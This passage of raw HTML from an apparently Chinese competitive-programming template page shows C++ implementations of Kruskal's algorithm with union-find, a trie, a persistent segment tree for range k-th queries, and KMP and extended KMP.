punctuation">;</span><span class="token keyword">bool</span> <span class="token function">cmp</span><span class="token punctuation">(</span>edge a<span class="token punctuation">,</span>edge b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>cost<span class="token operator">&lt;</span>b<span class="token punctuation">.</span>cost<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>      fa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">find_f</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> x<span class="token operator">=</span><span class="token function">find_f</span><span class="token punctuation">(</span>fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> <span class="token function">same</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">find_f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">find_f</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">unio</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u<span class="token operator">=</span><span class="token function">find_f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token operator">=</span><span class="token function">find_f</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>u<span class="token operator">==</span>v<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        fa<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">kruscal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>G<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>G<span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">,</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">same</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">,</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">unio</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">,</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token operator">+=</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>cost<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="10-trie树"><a href="#10-trie树" class="headerlink" title="10. trie树"></a>10. trie树</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Trie</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> next<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ed<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> L<span class="token punctuation">,</span> root<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>L<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        ed<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> L<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        L <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ed<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ed<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="11-主席树"><a href="#11-主席树" class="headerlink" title="11. 主席树"></a>11. 主席树</h3><h4 id="11-1-区间第K大"><a href="#11-1-区间第K大" class="headerlink" title="11.1 区间第K大"></a>11.1 区间第K大</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> tot<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> root<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum<span class="token punctuation">;</span>    <span class="token keyword">int</span> l<span class="token punctuation">,</span>r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> p<span class="token punctuation">[</span>maxn<span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> rt<span class="token operator">=</span><span class="token operator">++</span>tot<span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token operator">=</span>l<span class="token punctuation">,</span>p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token operator">=</span>r<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">==</span>r<span class="token punctuation">)</span>        <span class="token keyword">return</span> rt<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid<span class="token operator">=</span>l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token operator">=</span><span class="token function">build</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token operator">=</span><span class="token function">build</span><span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> pre<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> rt<span class="token operator">=</span><span class="token operator">++</span>tot<span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token operator">=</span>p<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mid<span class="token operator">=</span>l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">==</span>r<span class="token punctuation">)</span> <span class="token keyword">return</span> rt<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">>=</span>k<span class="token punctuation">)</span> p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token operator">=</span><span class="token function">update</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>p<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token operator">=</span><span class="token function">update</span><span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token punctuation">,</span>p<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">==</span>r<span class="token punctuation">)</span>        <span class="token keyword">return</span> l<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid<span class="token operator">=</span>l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sum<span class="token operator">=</span>p<span class="token punctuation">[</span>p<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token operator">-</span>p<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sum<span class="token operator">>=</span>k<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">query</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">,</span>p<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">query</span><span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token punctuation">,</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">,</span>p<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">,</span>k<span class="token operator">-</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector <span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token operator">></span>v<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">getid</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token operator">-</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> t<span class="token punctuation">;</span>    cin<span class="token operator">>></span>t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tot<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">clr</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">;</span>        root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token function">unique</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            root<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>root<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">getid</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>q<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin<span class="token operator">>></span>c<span class="token operator">>></span>d<span class="token operator">>></span>q<span class="token punctuation">;</span>            cout<span class="token operator">&lt;&lt;</span>v<span class="token punctuation">[</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>root<span class="token punctuation">[</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>root<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="12-KMP类算法"><a href="#12-KMP类算法" class="headerlink" title="12. KMP类算法"></a>12. KMP类算法</h3><h4 id="12-1-普通KMP"><a href="#12-1-普通KMP" class="headerlink" title="12.1 普通KMP"></a>12.1 普通KMP</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">KMP</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> next<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">Get_Next</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        next<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        next<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                i<span class="token operator">++</span><span class="token punctuation">,</span> j<span class="token operator">++</span><span class="token punctuation">;</span>                next<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                j <span class="token operator">=</span> next<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//p:匹配串 ； t: 原串</span>    <span class="token keyword">int</span> <span class="token function">Kmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>t<span class="token punctuation">,</span> <span class="token keyword">const</span> string <span class="token operator">&amp;</span>p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Get_Next</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> nt <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> np <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> nt <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> np<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                i<span class="token operator">++</span><span class="token punctuation">,</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                j <span class="token operator">=</span> next<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> np<span class="token punctuation">)</span>            <span class="token keyword">return</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/*Next数组的性质：（1）如果 len-next[len] 能被 len 整除则 len - next[len] 是该串的循环节（2）s[0] ~ s[next[len]-1] 中的内容一定能与 s[len-next[len]] ~ s[len-1] 匹配（3）s[0] ~ s[next[i]-1] 中的内容一定能与 s[i-next[i]] ~ s[i-1] 匹配*/</span></code></pre><h4 id="12-2-扩展KMP"><a href="#12-2-扩展KMP" class="headerlink" title="12.2 扩展KMP"></a>12.2 扩展KMP</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* 求解 T 中 nxt[]，注释参考 GetExtend() */</span><span class="token keyword">void</span> <span class="token function">GetNext</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span> T<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> nxt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    nxt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p <span class="token operator">||</span> i <span class="token operator">+</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span> <span class="token 